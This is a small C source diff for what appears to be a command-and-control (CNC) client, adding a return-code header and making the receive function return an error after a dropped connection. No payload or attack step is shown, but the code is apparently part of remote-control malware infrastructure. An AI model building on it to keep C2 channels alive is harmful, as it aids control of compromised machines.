@@ -7,6 +7,7 @@
 #include "cnc.h"
 #include "utils.h"
 #include "logger.h"
+#include "return_codes.h"
 
 SOCKET cnc_sock = INVALID_SOCKET;
 char *cnc_host = NULL;
@@ -114,6 +115,7 @@ int _recv_cnc(void *buf, size_t len, int flags)
     {
         log_error("Connection with CNC broke.");
         reconnect_cnc();
+        return E_CONNECTION_CLOSED;
     }
     return bytes_read;
 }
